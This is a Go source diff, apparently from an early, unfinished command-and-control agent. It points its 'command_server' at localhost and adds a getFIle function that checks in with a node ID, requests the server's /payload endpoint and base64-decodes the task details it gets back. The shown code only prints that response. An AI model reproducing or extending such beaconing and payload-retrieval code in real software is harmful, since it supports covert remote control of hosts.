@@ -6,6 +6,7 @@ import (
 	"fmt"
 
 	// "io/ioutil"
+	b64 "encoding/base64"
 	"log"
 	"net/http"
 	"os"
@@ -19,9 +20,10 @@ import (
 	// "github.com/mitchellh/go-homedir"
 )
 
-var command_server string = "http://192.168.0.69:8081"
+// var command_server string = "http://192.168.0.69:8081"
 
-// var command_server string = "http://localhost:8081"
+var command_server string = "http://localhost:8081"
+
 var NodeID string = "" // This will be a GUID at some point
 
 // Checking errors
@@ -41,6 +43,8 @@ func main() {
 	// test()
 
 	checkIn()
+
+	getFIle()
 
 	// Writing a file. I am pretty sure this is a ass backwards way of doing it
 
@@ -148,16 +152,56 @@ func checkIn() {
 
 }
 
-func test() {
-	log.Println("This is a test")
+func getFIle() {
 
-	out, errorMessage := runCommand("say hello")
-	if errorMessage != "" {
-		log.Println(errorMessage)
-		return
-	} else {
-		log.Println(out)
+	fmt.Println("\nStarting the getting file thing")
+
+	data := map[string]string{"ID": NodeID}
+
+	json_data, err := json.Marshal(data)
+	if err != nil {
+		log.Fatal(err)
 	}
+
+	r, err := http.NewRequest("POST", command_server+"/payload", bytes.NewBuffer(json_data))
+	if err != nil {
+		panic(err)
+	}
+
+	// Add the header to say that it's json
+	r.Header.Add("Content-Type", "application/json")
+
+	//Create a client to send the data and then send it
+	client := &http.Client{}
+	res, err := client.Do(r)
+	if err != nil {
+		panic(err)
+	}
+
+	//shrug
+	defer res.Body.Close()
+
+	fmt.Println(res.StatusCode)
+
+	// Parse the JSON response
+	post := &command{}
+
+	fmt.Println(1)
+	derr := json.NewDecoder(res.Body).Decode(post)
+	if derr != nil {
+		panic(derr)
+	}
+
+	// Decoding the body so it's readable
+	details, _ := b64.StdEncoding.DecodeString(post.Details)
+	fmt.Println(string(details))
+
+	// Output the JSON response
+	fmt.Println("ID: ", post.ID)
+	fmt.Println("Command: ", post.Command)
+	fmt.Println("Details: ", string(details))
+
+	//
 
 }
 
